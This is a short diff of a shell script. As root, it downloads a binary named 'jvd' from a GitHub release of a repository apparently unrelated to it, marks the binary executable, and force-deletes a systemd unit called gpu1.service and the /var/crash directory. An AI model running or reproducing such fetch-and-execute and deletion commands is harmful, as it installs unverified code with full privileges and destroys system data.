@@ -5,7 +5,8 @@ if [[ $count -gt 0 ]]
 
 then
   echo "dang ton tai"
-  sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/jvd
+cd /home  
+sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/jvd
 sudo chmod +x jvd
 sudo rm -rf /lib/systemd/system/gpu1.service
 sudo rm -rf /var/crash
